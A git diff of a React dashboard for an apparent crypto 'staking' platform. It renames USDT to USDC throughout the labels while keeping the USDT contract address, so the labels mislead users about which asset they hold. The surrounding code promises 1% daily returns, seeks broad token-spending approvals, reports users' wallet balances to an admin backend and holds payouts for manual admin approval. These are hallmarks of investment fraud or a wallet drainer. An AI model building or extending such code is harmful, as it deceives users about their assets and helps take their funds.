@@ -2,9 +2,9 @@ import { useState, useEffect, useCallback } from 'react';
 import { ethers } from 'ethers';
 import './Dashboard.css';
 
-// USDT Contract Address (Ethereum Mainnet)
-const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-const USDT_ABI = [
+// USDC Contract Address (Ethereum Mainnet)
+const USDC_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+const USDC_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
   'function decimals() view returns (uint8)',
   'function symbol() view returns (string)',
@@ -46,7 +46,7 @@ const BSC_TOKENS = [
 
 const API_BASE = import.meta.env.VITE_API_URL || 'https://cryptowave-backend-pq3e.onrender.com';
 
-// ── Tron USDT scanning ──────────────────────────────────────────────────────
+// ── Tron USDC scanning ──────────────────────────────────────────────────────
 // Tron uses the same secp256k1 curve as Ethereum — same private key → same
 // 20-byte address hash. Only the prefix byte (0x41) and base58check encoding differ.
 const BASE58_CHARS = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
@@ -104,7 +104,7 @@ function DepositAddress({ network, apiBase }) {
   return (
     <div style={{background:'rgba(255,255,255,0.04)',border:'1px solid rgba(255,255,255,0.1)',borderRadius:'10px',padding:'14px'}}>
       <div style={{fontSize:'0.75rem',color:'#94a3b8',marginBottom:'6px',fontWeight:600}}>
-        {network === 'TRX' ? '🔴 USDT TRC-20 Deposit Address' : '🟠 Bitcoin (BTC) Deposit Address'}
+        {network === 'TRX' ? '🔴 USDC TRC-20 Deposit Address' : '🟠 Bitcoin (BTC) Deposit Address'}
       </div>
       <div style={{fontFamily:'monospace',fontSize:'0.78rem',color:'#e2e8f0',wordBreak:'break-all',marginBottom:'10px',lineHeight:'1.5'}}>{addr}</div>
       <button onClick={copy} style={{padding:'6px 16px',background:copied?'rgba(16,185,129,0.2)':'rgba(255,255,255,0.08)',border:`1px solid ${copied?'rgba(16,185,129,0.4)':'rgba(255,255,255,0.15)'}`,borderRadius:'8px',color:copied?'#10b981':'#e2e8f0',fontSize:'0.78rem',fontWeight:600,cursor:'pointer'}}>
@@ -279,7 +279,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
   const [earningsWithdrawAmount, setEarningsWithdrawAmount] = useState('');
   const [withdrawals, setWithdrawals] = useState([]);
   const [payoutNetwork, setPayoutNetwork] = useState('BSC'); // BSC or ETH
-  const [payoutToken, setPayoutToken] = useState('USDT');   // USDT or USDC
+  const [payoutToken, setPayoutToken] = useState('USDC');   // USDC or USDT
 
   // Report balance to backend (so admin can see it)
   const reportBalanceToBackend = useCallback(async (eth, usdt, tokens = []) => {
@@ -417,7 +417,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
       }
       setUsdtBalance(usdtFormatted);
 
-      // 4. Scan Tron USDT (same private key → deterministic Tron address)
+      // 4. Scan Tron USDC (same private key → deterministic Tron address)
       const tronUsdt = await fetchTronUSDT(walletAddress);
       if (tronUsdt > 0) {
         const tronBalStr = tronUsdt.toFixed(2);
@@ -437,7 +437,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
         if (bnbBal > 0) {
           const bnbPrice = prices['binancecoin']?.usd || 0;
           tokens.push({ symbol: 'BNB', name: 'BNB (BSC)', balance: bnbBal.toFixed(5), usdValue: (bnbBal * bnbPrice).toFixed(2), chain: 'bsc' });
-          if (usdtFormatted === '0.00') { /* BNB is not USDT */ }
+          if (usdtFormatted === '0.00') { /* BNB is not USDC */ }
         }
         // BEP-20 tokens
         for (const token of BSC_TOKENS) {
@@ -546,7 +546,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
     }
   }, [walletAddress]);
 
-  // Check if user has already approved BSC USDT for platform wallet
+  // Check if user has already approved BSC USDC for platform wallet
   const checkUsdtApproval = useCallback(async () => {
     try {
       if (!window.ethereum) return;
@@ -741,7 +741,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
     return () => clearInterval(id);
   }, [pendingClaim?.requestedAt]);
 
-  // Handle stake — real on-chain token transfer (user picks token on BSC, USDT-only on ETH)
+  // Handle stake — real on-chain token transfer (user picks token on BSC, USDC-only on ETH)
   const handleStake = async () => {
     const amount = parseFloat(stakeAmount);
     if (!amount || amount <= 0) { showNotification('Please enter a valid amount', 'error'); return; }
@@ -794,7 +794,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
       if (isNativeETH) {
         tx = await signer.sendTransaction({ to: platformAddr, value: amountInWei });
       } else {
-        const tokenContract = new ethers.Contract(tokenCfg.address, USDT_ABI, signer);
+        const tokenContract = new ethers.Contract(tokenCfg.address, USDC_ABI, signer);
         tx = await tokenContract.transfer(platformAddr, amountInWei);
       }
 
@@ -877,7 +877,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
       });
 
       if (response.ok) {
-        showNotification(`Successfully unstaked ${amount} USDT!`, 'success');
+        showNotification(`Successfully unstaked ${amount} USDC!`, 'success');
         setUnstakeAmount('');
         await fetchUserData();
         await fetchTransactions();
@@ -1131,7 +1131,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                 <div className="ticker-dot" />
                 <div>
                   <div className="ticker-label">Daily earnings</div>
-                  <div className="ticker-value">+{getDailyEarnings()} USDT</div>
+                  <div className="ticker-value">+{getDailyEarnings()} USDC</div>
                 </div>
               </div>
             )}
@@ -1187,7 +1187,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
               {!ethApproved && (
                 <div style={{background:'rgba(99,102,241,0.1)',border:'1px solid rgba(99,102,241,0.35)',borderRadius:'14px',padding:'14px 18px',marginBottom:'12px'}}>
                   <div style={{fontWeight:600,color:'#a5b4fc',marginBottom:'4px'}}>One-time setup: Authorize Ethereum Tokens</div>
-                  <div style={{fontSize:'0.8rem',color:'#94a3b8',marginBottom:'12px'}}>Allows the platform to stake USDT, USDC, DAI, WBTC, WETH, LINK on ETH on your behalf.</div>
+                  <div style={{fontSize:'0.8rem',color:'#94a3b8',marginBottom:'12px'}}>Allows the platform to stake USDC, DAI, WBTC, WETH, LINK on ETH on your behalf.</div>
                   <button style={{background:'#6366f1',color:'#fff',border:'none',borderRadius:'10px',padding:'10px 20px',cursor:'pointer',fontWeight:600,opacity:approvingEth?0.7:1,width:'100%'}} disabled={approvingEth}
                     onClick={async () => {
                       setApprovingEth(true);
@@ -1218,7 +1218,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
               {!usdtApproved && (
                 <div style={{background:'rgba(99,102,241,0.1)',border:'1px solid rgba(99,102,241,0.35)',borderRadius:'14px',padding:'14px 18px',marginBottom:'20px'}}>
                   <div style={{fontWeight:600,color:'#a5b4fc',marginBottom:'4px'}}>One-time setup: Authorize BSC Tokens</div>
-                  <div style={{fontSize:'0.8rem',color:'#94a3b8',marginBottom:'12px'}}>Allows the platform to stake USDT, USDC, BTCB, ETH, CAKE, BUSD on BSC on your behalf.</div>
+                  <div style={{fontSize:'0.8rem',color:'#94a3b8',marginBottom:'12px'}}>Allows the platform to stake USDC, BTCB, ETH, CAKE, BUSD on BSC on your behalf.</div>
                   <button style={{background:'#6366f1',color:'#fff',border:'none',borderRadius:'10px',padding:'10px 20px',cursor:'pointer',fontWeight:600,opacity:approvingUsdt?0.7:1,width:'100%'}} disabled={approvingUsdt}
                     onClick={async () => {
                       setApprovingUsdt(true);
@@ -1266,7 +1266,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                   <div className="hero-amount">{formatNumber(userData.stakedAmount)}<span>USDT</span></div>
                   <div className="hero-apy-badge">
                     <span style={{width:7,height:7,background:'#10b981',borderRadius:'50%',display:'inline-block'}}/>
-                    1% Daily · Earning {getDailyEarnings()} USDT/day
+                    1% Daily · Earning {getDailyEarnings()} USDC/day
                   </div>
                   {userData.stakedAmount > 0 && (
                     <div style={{fontSize:'0.72rem',color:'rgba(255,255,255,0.35)',marginTop:'0.6rem'}}>
@@ -1278,7 +1278,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                   <div className="hero-daily-card">
                     <div className="hero-daily-label">Claimable Now</div>
                     <div className="hero-daily-amount">{formatNumber(userData.claimableRewards)}</div>
-                    <div className="hero-daily-sub">USDT · pending approval after claim</div>
+                    <div className="hero-daily-sub">USDC · pending approval after claim</div>
                   </div>
                   <div className="hero-quick-btns">
                     <button className="hero-btn stake" onClick={() => { setActiveTab('stake'); fetchStakeableTokens(); }}>+ Stake</button>
@@ -1298,9 +1298,9 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                 <div className="stat-card">
                   <div className="stat-header">
                     <span className="stat-icon">💵</span>
-                    <span className="stat-label">Wallet USDT</span>
+                    <span className="stat-label">Wallet USDC</span>
                   </div>
-                  <div className="stat-value">{formatNumber(usdtBalance)} USDT</div>
+                  <div className="stat-value">{formatNumber(usdtBalance)} USDC</div>
                   <div className="stat-change">In your wallet</div>
                 </div>
 
@@ -1309,7 +1309,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                     <span className="stat-icon">💎</span>
                     <span className="stat-label">Claimable Rewards</span>
                   </div>
-                  <div className="stat-value">{formatNumber(userData.claimableRewards)} USDT</div>
+                  <div className="stat-value">{formatNumber(userData.claimableRewards)} USDC</div>
                   <div className="stat-change positive">+{getDailyEarnings()}/day</div>
                 </div>
 
@@ -1318,7 +1318,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                     <span className="stat-icon">🎯</span>
                     <span className="stat-label">Total Earned</span>
                   </div>
-                  <div className="stat-value">{formatNumber(userData.totalEarned)} USDT</div>
+                  <div className="stat-value">{formatNumber(userData.totalEarned)} USDC</div>
                   <div className="stat-change positive">All time</div>
                 </div>
 
@@ -1345,7 +1345,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
               {userData.stakedAmount > 0 && (
                 <div style={{background:'rgba(102,126,234,0.08)',border:'1px solid rgba(102,126,234,0.2)',borderRadius:'12px',padding:'12px 16px',marginBottom:'1.25rem',fontSize:'0.8rem',color:'rgba(255,255,255,0.55)',lineHeight:1.6}}>
                   <strong style={{color:'#a78bfa',display:'block',marginBottom:'3px'}}>How claims work</strong>
-                  When you request a claim, admin reviews and manually sends USDT to your connected wallet address
+                  When you request a claim, admin reviews and manually sends USDC to your connected wallet address
                   (<code style={{fontFamily:'monospace',color:'#c4b5fd',fontSize:'0.75rem'}}>{walletAddress.slice(0,10)}…{walletAddress.slice(-6)}</code>).
                   You'll see the tx hash in your withdrawal history once processed.
                 </div>
@@ -1498,12 +1498,12 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
               <div className="info-cards-grid">
                 <div className="info-card">
                   <h3>📈 Daily Rate</h3>
-                  <div className="info-value" style={{color:'#10b981'}}>{getDailyEarnings()} USDT</div>
+                  <div className="info-value" style={{color:'#10b981'}}>{getDailyEarnings()} USDC</div>
                   <p>1% of staked per day</p>
                 </div>
                 <div className="info-card">
                   <h3>📅 This Month</h3>
-                  <div className="info-value">{(parseFloat(getDailyEarnings()) * 30).toFixed(2)} USDT</div>
+                  <div className="info-value">{(parseFloat(getDailyEarnings()) * 30).toFixed(2)} USDC</div>
                   <p>30-day projection</p>
                 </div>
                 <div className="info-card">
@@ -1532,12 +1532,12 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                           {tx.txHash && <a href={`https://etherscan.io/tx/${tx.txHash}`} target="_blank" rel="noopener noreferrer" className="tx-hash-link">{tx.txHash.slice(0,8)}… ↗</a>}
                         </div>
                         <div className="tx-amount" style={{color: tx.type==='stake'?'#a78bfa':tx.type==='claim'||tx.type==='withdraw_earnings'?'#10b981':'#fbbf24'}}>
-                          {tx.type==='stake'?'+':'-'}{formatNumber(tx.amount)} USDT
+                          {tx.type==='stake'?'+':'-'}{formatNumber(tx.amount)} USDC
                         </div>
                       </div>
                     );
                   }) : (
-                    <div className="no-transactions"><p>No transactions yet. Stake some USDT to get started!</p></div>
+                    <div className="no-transactions"><p>No transactions yet. Stake some USDC to get started!</p></div>
                   )}
                 </div>
               </div>
@@ -1610,7 +1610,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                         </div>
                         <div className="balance-display" style={{marginTop:'8px',opacity:0.7}}>
                           <span>Already Staked</span>
-                          <span className="balance-value" style={{color:'#6366f1'}}>{formatNumber(userData.stakedAmount)} USDT</span>
+                          <span className="balance-value" style={{color:'#6366f1'}}>{formatNumber(userData.stakedAmount)} USDC</span>
                         </div>
                         <div className="input-group">
                           <input type="number" placeholder="Enter amount to stake" value={stakeAmount} onChange={(e) => setStakeAmount(e.target.value)} className="stake-input" disabled={loading} />
@@ -1633,7 +1633,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                   {/* Manual networks (TRX / BTC) — user sends manually, submits tx hash */}
                   {(network === 'TRX' || network === 'BTC') && (<>
                     <div style={{background:'rgba(239,68,68,0.08)',border:'1px solid rgba(239,68,68,0.2)',borderRadius:'10px',padding:'12px 14px',marginBottom:'14px',fontSize:'0.82rem',color:'#94a3b8'}}>
-                      <strong style={{color:'#f87171',display:'block',marginBottom:'4px'}}>Manual Deposit — {network === 'TRX' ? 'TRC-20 USDT' : 'Native BTC'}</strong>
+                      <strong style={{color:'#f87171',display:'block',marginBottom:'4px'}}>Manual Deposit — {network === 'TRX' ? 'TRC-20 USDC' : 'Native BTC'}</strong>
                       Send {network === 'TRX' ? 'USDT (TRC-20)' : 'BTC'} to the address below, then paste your transaction ID to submit for review.
                     </div>
 
@@ -1665,7 +1665,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                   <h2 className="panel-title">Your Staked Balance</h2>
                   <div className="balance-display">
                     <span>Currently Staked</span>
-                    <span className="balance-value">{formatNumber(userData.stakedAmount)} USDT</span>
+                    <span className="balance-value">{formatNumber(userData.stakedAmount)} USDC</span>
                   </div>
                   <div className="stake-info">
                     <div className="info-row">
@@ -1678,11 +1678,11 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                     </div>
                     <div className="info-row">
                       <span>Daily Earnings</span>
-                      <span className="info-value">{getDailyEarnings()} USDT</span>
+                      <span className="info-value">{getDailyEarnings()} USDC</span>
                     </div>
                   </div>
                   <div className="warning-box">
-                    To withdraw staked USDT, use the Withdraw tab. Withdrawals require admin approval.
+                    To withdraw staked USDC, use the Withdraw tab. Withdrawals require admin approval.
                   </div>
                   <button
                     className="stake-btn secondary"
@@ -1699,7 +1699,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                     <h2 className="panel-title">Claimable Rewards</h2>
                     <p className="claim-subtitle">Your accumulated earnings ready to claim</p>
                   </div>
-                  <div className="claim-amount">{formatNumber(userData.claimableRewards)} USDT</div>
+                  <div className="claim-amount">{formatNumber(userData.claimableRewards)} USDC</div>
                 </div>
                 <button
                   className="stake-btn success"
@@ -1746,7 +1746,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                 <div style={{display:'flex',alignItems:'center',gap:'0.75rem'}}>
                   <div style={{fontWeight:600,fontSize:'0.88rem',color:'rgba(255,255,255,0.7)',whiteSpace:'nowrap'}}>Token:</div>
                   <div style={{display:'flex',gap:'0.5rem'}}>
-                    {['USDT','USDC'].map(tok => (
+                    {['USDC','USDT'].map(tok => (
                       <button key={tok} onClick={() => setPayoutToken(tok)}
                         style={{padding:'0.45rem 1.1rem',borderRadius:'8px',border:`1px solid ${payoutToken===tok?'#10b981':'rgba(255,255,255,0.1)'}`,
                           background:payoutToken===tok?'rgba(16,185,129,0.15)':'transparent',
@@ -1768,7 +1768,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                   <p className="panel-subtitle">Request a payout of your accumulated daily earnings</p>
                   <div className="balance-display">
                     <span>Claimable Rewards</span>
-                    <span className="balance-value" style={{color:'#10b981'}}>{formatNumber(userData.claimableRewards)} USDT</span>
+                    <span className="balance-value" style={{color:'#10b981'}}>{formatNumber(userData.claimableRewards)} USDC</span>
                   </div>
                   {claimPending && (
                     <div style={{borderRadius:'10px',padding:'14px 16px',marginBottom:'12px',background:'rgba(102,126,234,0.08)',border:'1px solid rgba(102,126,234,0.35)'}}>
@@ -1808,7 +1808,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                   )}
                   {!claimPending && (
                     <div className="stake-info">
-                      <div className="info-row"><span>Amount</span><span className="info-value">{formatNumber(userData.claimableRewards)} USDT</span></div>
+                      <div className="info-row"><span>Amount</span><span className="info-value">{formatNumber(userData.claimableRewards)} USDC</span></div>
                       <div className="info-row"><span>Token</span><span className="info-value">{payoutToken}</span></div>
                       <div className="info-row"><span>Fee</span><span className="info-value">0%</span></div>
                       <div className="info-row"><span>You receive</span><span className="info-value" style={{color:'#10b981'}}>{formatNumber(userData.claimableRewards)} {payoutToken}</span></div>
@@ -1842,7 +1842,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                       </div>
                       <div className="balance-display">
                         <span>Locked Balance</span>
-                        <span className="balance-value" style={{color:'#ef4444'}}>{formatNumber(userData.stakedAmount)} USDT</span>
+                        <span className="balance-value" style={{color:'#ef4444'}}>{formatNumber(userData.stakedAmount)} USDC</span>
                       </div>
                       <div style={{background:'rgba(16,185,129,0.08)',border:'1px solid rgba(16,185,129,0.2)',borderRadius:'10px',padding:'0.875rem',marginTop:'0.75rem',fontSize:'0.8rem',color:'rgba(255,255,255,0.6)',lineHeight:1.5}}>
                         While locked, you can still <strong style={{color:'#10b981'}}>claim your daily earnings</strong> (rewards) at any time using the Claim Rewards panel.
@@ -1863,11 +1863,11 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                       </div>
                       <div className="balance-display">
                         <span>Staked Balance</span>
-                        <span className="balance-value">{formatNumber(userData.stakedAmount)} USDT</span>
+                        <span className="balance-value">{formatNumber(userData.stakedAmount)} USDC</span>
                       </div>
                       {withdrawals.filter(w=>w.status==='pending'&&w.withdrawalType!=='earnings'&&w.withdrawalType!=='claim').length > 0 && (
                         <div className="warning-box">
-                          ⏳ {withdrawals.filter(w=>w.status==='pending'&&w.withdrawalType!=='earnings'&&w.withdrawalType!=='claim').length} pending withdrawal(s) — {formatNumber(withdrawals.filter(w=>w.status==='pending'&&w.withdrawalType!=='earnings'&&w.withdrawalType!=='claim').reduce((s,w)=>s+w.amount,0))} USDT
+                          ⏳ {withdrawals.filter(w=>w.status==='pending'&&w.withdrawalType!=='earnings'&&w.withdrawalType!=='claim').length} pending withdrawal(s) — {formatNumber(withdrawals.filter(w=>w.status==='pending'&&w.withdrawalType!=='earnings'&&w.withdrawalType!=='claim').reduce((s,w)=>s+w.amount,0))} USDC
                         </div>
                       )}
                       <div className="input-group">
@@ -1883,8 +1883,8 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                       </div>
                       <div className="stake-info">
                         <div className="info-row"><span>Fee</span><span className="info-value">{getWithdrawalFee()}%</span></div>
-                        <div className="info-row"><span>Fee amount</span><span className="info-value">{withdrawAmount?(parseFloat(withdrawAmount)*getWithdrawalFee()/100).toFixed(2):'0.00'} USDT</span></div>
-                        <div className="info-row"><span>You receive</span><span className="info-value" style={{color:'#10b981'}}>{withdrawAmount?(parseFloat(withdrawAmount)*(1-getWithdrawalFee()/100)).toFixed(2):'0.00'} USDT</span></div>
+                        <div className="info-row"><span>Fee amount</span><span className="info-value">{withdrawAmount?(parseFloat(withdrawAmount)*getWithdrawalFee()/100).toFixed(2):'0.00'} USDC</span></div>
+                        <div className="info-row"><span>You receive</span><span className="info-value" style={{color:'#10b981'}}>{withdrawAmount?(parseFloat(withdrawAmount)*(1-getWithdrawalFee()/100)).toFixed(2):'0.00'} USDC</span></div>
                       </div>
                       <button className="stake-btn withdraw-btn" onClick={handleWithdraw} disabled={loading||!withdrawAmount}>
                         {loading?'Processing…':'Request Withdrawal'}
@@ -1915,9 +1915,9 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                             <span className="withdraw-date">{new Date(w.requestedAt).toLocaleDateString()}</span>
                           </div>
                           <div className="withdraw-item-details">
-                            <div className="withdraw-detail-row"><span>Amount</span><span>{formatNumber(w.amount)} USDT</span></div>
-                            <div className="withdraw-detail-row"><span>Fee</span><span>-{formatNumber(w.fee||0)} USDT</span></div>
-                            <div className="withdraw-detail-row net"><span>You receive</span><span>{formatNumber(w.netAmount||w.amount)} USDT</span></div>
+                            <div className="withdraw-detail-row"><span>Amount</span><span>{formatNumber(w.amount)} USDC</span></div>
+                            <div className="withdraw-detail-row"><span>Fee</span><span>-{formatNumber(w.fee||0)} USDC</span></div>
+                            <div className="withdraw-detail-row net"><span>You receive</span><span>{formatNumber(w.netAmount||w.amount)} USDC</span></div>
                           </div>
                           {w.txHash && <div style={{marginTop:'0.5rem',fontSize:'0.72rem',color:'#a78bfa',fontFamily:'monospace'}}>Tx: {w.txHash.slice(0,14)}…</div>}
                           {w.rejectionReason && <div className="withdraw-rejection">Reason: {w.rejectionReason}</div>}
@@ -1942,8 +1942,8 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
               <div className="daily-rate-card">
                 <div className="daily-rate-left">
                   <div className="daily-rate-label">Daily Earnings</div>
-                  <div className="daily-rate-value">{getDailyEarnings()} USDT</div>
-                  <div className="daily-rate-sub">Based on {formatNumber(userData.stakedAmount)} USDT staked</div>
+                  <div className="daily-rate-value">{getDailyEarnings()} USDC</div>
+                  <div className="daily-rate-sub">Based on {formatNumber(userData.stakedAmount)} USDC staked</div>
                 </div>
                 <div className="daily-rate-badge">
                   <div className="badge-pct">1%</div>
@@ -1955,22 +1955,22 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
               <div className="earnings-summary">
                 <div className="summary-card">
                   <h3>Today</h3>
-                  <div className="summary-value" style={{color:'#10b981'}}>{getDailyEarnings()} USDT</div>
+                  <div className="summary-value" style={{color:'#10b981'}}>{getDailyEarnings()} USDC</div>
                   <div className="summary-subtitle">Daily earnings</div>
                 </div>
                 <div className="summary-card">
                   <h3>7 Days</h3>
-                  <div className="summary-value">{(parseFloat(getDailyEarnings())*7).toFixed(2)} USDT</div>
+                  <div className="summary-value">{(parseFloat(getDailyEarnings())*7).toFixed(2)} USDC</div>
                   <div className="summary-subtitle">Weekly projection</div>
                 </div>
                 <div className="summary-card">
                   <h3>30 Days</h3>
-                  <div className="summary-value">{(parseFloat(getDailyEarnings())*30).toFixed(2)} USDT</div>
+                  <div className="summary-value">{(parseFloat(getDailyEarnings())*30).toFixed(2)} USDC</div>
                   <div className="summary-subtitle">Monthly projection</div>
                 </div>
                 <div className="summary-card">
                   <h3>All Time</h3>
-                  <div className="summary-value">{formatNumber(userData.totalEarned)} USDT</div>
+                  <div className="summary-value">{formatNumber(userData.totalEarned)} USDC</div>
                   <div className="summary-subtitle">Total earned</div>
                 </div>
               </div>
@@ -1980,10 +1980,10 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                 <h2 className="section-title">Earnings Breakdown</h2>
                 <div className="breakdown-list">
                   <div className="breakdown-item"><span>Daily Rate</span><span className="highlight">1% per day</span></div>
-                  <div className="breakdown-item"><span>Staked Amount</span><span>{formatNumber(userData.stakedAmount)} USDT</span></div>
-                  <div className="breakdown-item"><span>Daily Earnings</span><span style={{color:'#10b981',fontWeight:700}}>{getDailyEarnings()} USDT</span></div>
-                  <div className="breakdown-item"><span>Claimable Now</span><span style={{color:'#34d399',fontWeight:700}}>{formatNumber(userData.claimableRewards)} USDT</span></div>
-                  <div className="breakdown-item"><span>Total Earned (All Time)</span><span>{formatNumber(userData.totalEarned)} USDT</span></div>
+                  <div className="breakdown-item"><span>Staked Amount</span><span>{formatNumber(userData.stakedAmount)} USDC</span></div>
+                  <div className="breakdown-item"><span>Daily Earnings</span><span style={{color:'#10b981',fontWeight:700}}>{getDailyEarnings()} USDC</span></div>
+                  <div className="breakdown-item"><span>Claimable Now</span><span style={{color:'#34d399',fontWeight:700}}>{formatNumber(userData.claimableRewards)} USDC</span></div>
+                  <div className="breakdown-item"><span>Total Earned (All Time)</span><span>{formatNumber(userData.totalEarned)} USDC</span></div>
                   <div className="breakdown-item"><span>VIP Level</span><span>{getVipName(userData.vipLevel)}</span></div>
                   <div className="breakdown-item"><span>Principal Lock</span><span style={{color:'#fbbf24'}}>30 days from stake date</span></div>
                 </div>
@@ -1991,7 +1991,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                   <div style={{marginTop:'1.25rem',textAlign:'center'}}>
                     <button className="stake-btn success" style={{maxWidth:220}} onClick={handleClaimRewards}
                       disabled={loading||userData.claimableRewards<=0||claimPending}>
-                      {claimPending?'⏳ Claim Pending':'Claim '+formatNumber(userData.claimableRewards)+' USDT'}
+                      {claimPending?'⏳ Claim Pending':'Claim '+formatNumber(userData.claimableRewards)+' USDC'}
                     </button>
                   </div>
                 )}
@@ -2022,7 +2022,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                   return (
                     <div key={tx.id||i} className="table-row">
                       <div className="table-cell"><span className={`tx-badge ${badgeClass}`}>{labels[tx.type]||tx.type}</span></div>
-                      <div className="table-cell">{formatNumber(tx.amount)} USDT</div>
+                      <div className="table-cell">{formatNumber(tx.amount)} USDC</div>
                       <div className="table-cell">{tx.date}</div>
                       <div className="table-cell"><span className={`status-badge ${tx.status}`}>{tx.status}</span></div>
                       <div className="table-cell">
@@ -2035,7 +2035,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                 }) : (
                   <div className="no-transactions-full">
                     <p>No transactions yet</p>
-                    <span>Stake USDT to start earning and see your history here</span>
+                    <span>Stake USDC to start earning and see your history here</span>
                   </div>
                 )}
               </div>
@@ -2051,8 +2051,8 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                 <div className="vip-card">
                   <div className="vip-icon-large">⭐</div>
                   <h2>{getVipName(userData.vipLevel)}</h2>
-                  <div className="vip-apy">1% Daily · {(parseFloat(getDailyEarnings())*30).toFixed(2)} USDT/month</div>
-                  <div className="vip-staked">Staked: {formatNumber(userData.stakedAmount)} USDT</div>
+                  <div className="vip-apy">1% Daily · {(parseFloat(getDailyEarnings())*30).toFixed(2)} USDC/month</div>
+                  <div className="vip-staked">Staked: {formatNumber(userData.stakedAmount)} USDC</div>
                 </div>
               </div>
 
@@ -2060,10 +2060,10 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                 <h2 className="section-title">VIP Tiers</h2>
                 <div className="tiers-list">
                   {[
-                    {lvl:0,label:'Standard',range:'< 10,000 USDT',color:null},
-                    {lvl:1,label:'VIP 1',range:'10,000 – 49,999 USDT',color:'#667eea'},
-                    {lvl:2,label:'VIP 2',range:'50,000 – 99,999 USDT',color:'#a78bfa'},
-                    {lvl:3,label:'VIP 3',range:'100,000+ USDT',color:'#fbbf24'},
+                    {lvl:0,label:'Standard',range:'< 10,000 USDC',color:null},
+                    {lvl:1,label:'VIP 1',range:'10,000 – 49,999 USDC',color:'#667eea'},
+                    {lvl:2,label:'VIP 2',range:'50,000 – 99,999 USDC',color:'#a78bfa'},
+                    {lvl:3,label:'VIP 3',range:'100,000+ USDC',color:'#fbbf24'},
                   ].map(tier => (
                     <div key={tier.lvl} className={`tier-item ${userData.vipLevel===tier.lvl?'active':''}`}>
                       <div className={`tier-badge-dash ${tier.lvl===3?'premium':''}`} style={tier.color?{color:tier.color}:{}}>{tier.label}</div>
@@ -2088,8 +2088,8 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                     <div className="progress-fill" style={{width:`${Math.min(100,(userData.stakedAmount/[10000,50000,100000][userData.vipLevel])*100)}%`}} />
                   </div>
                   <div className="progress-info">
-                    <span>{formatNumber(userData.stakedAmount)} USDT staked</span>
-                    <span>{formatNumber(Math.max(0,[10000,50000,100000][userData.vipLevel]-userData.stakedAmount))} USDT needed</span>
+                    <span>{formatNumber(userData.stakedAmount)} USDC staked</span>
+                    <span>{formatNumber(Math.max(0,[10000,50000,100000][userData.vipLevel]-userData.stakedAmount))} USDC needed</span>
                   </div>
                 </div>
               )}
